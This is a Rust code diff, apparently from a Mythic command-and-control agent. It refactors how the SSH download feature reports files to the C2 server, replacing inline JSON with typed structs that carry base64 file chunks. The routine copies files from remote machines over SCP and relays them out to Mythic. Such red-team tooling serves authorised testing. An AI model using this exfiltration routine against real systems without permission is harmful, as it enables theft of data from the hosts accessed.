@@ -1,3 +1,4 @@
+use serde::Serialize;
 use serde_json::json;
 
 use crate::agent::{AgentTask, ContinuedData};
@@ -14,6 +15,44 @@ use super::SshArgs;
 
 /// Chunk size used for file transfer
 const CHUNK_SIZE: usize = 512000;
+
+/// Response sent for initiating a download
+#[derive(Serialize)]
+struct SshDownloadResponse<'a> {
+    /// Total chunks in the download
+    total_chunks: usize,
+
+    /// Full path to the file to download
+    full_path: Option<&'a str>,
+
+    /// Host the downloaded file is from
+    host: &'a str,
+
+    /// Optional extra filename for the file
+    filename: Option<String>,
+
+    /// Whether this download is a screenshot
+    is_screenshot: bool,
+
+    /// Size of each download chunk
+    chunk_size: usize,
+}
+
+/// Information containing each downloaded chunk
+#[derive(Serialize)]
+struct SshDownloadChunk<'a> {
+    /// The current chunk being transferred
+    chunk_num: usize,
+
+    /// The file id associated with the download
+    file_id: &'a str,
+
+    /// The base64 encoded data of the file
+    chunk_data: String,
+
+    /// The size of the current chunk
+    chunk_size: usize,
+}
 
 /// Function used to download a file from a machine with SCP and upload it to Mythic
 /// * `sess` - Connected SSH session
@@ -47,13 +86,19 @@ pub fn download_file(
     // Get the number of chunks for the file transfer
     let total_chunks = ((file_len as f64 / CHUNK_SIZE as f64).ceil()) as usize;
 
+    let download_data = SshDownloadResponse {
+        total_chunks,
+        full_path: Some(file_path),
+        host: &args.host,
+        is_screenshot: false,
+        chunk_size: CHUNK_SIZE,
+        filename: None,
+    };
+
     // Initialize the upload procedure to Mythic
     tx.send(json!({
-        "total_chunks": total_chunks,
         "task_id": task.id,
-        "full_path": &file_path,
-        "host": args.host,
-        "is_screenshot": false,
+        "download": download_data,
     }))?;
 
     let mut c = Cursor::new(file_data);
@@ -72,12 +117,16 @@ pub fn download_file(
 
         let chunk_data = base64::encode(&buffer[..len]);
 
+        let chunk_metadata = SshDownloadChunk {
+            chunk_num: num + 1,
+            chunk_size: len,
+            file_id: &file_id,
+            chunk_data,
+        };
+
         tx.send(json!({
-            "chunk_num": num + 1,
-            "file_id": file_id,
-            "chunk_data": chunk_data,
             "task_id": task.id,
-            "total_chunks": -1,
+            "download": chunk_metadata
         }))?;
 
         let _: AgentTask = serde_json::from_value(rx.recv()?)?;
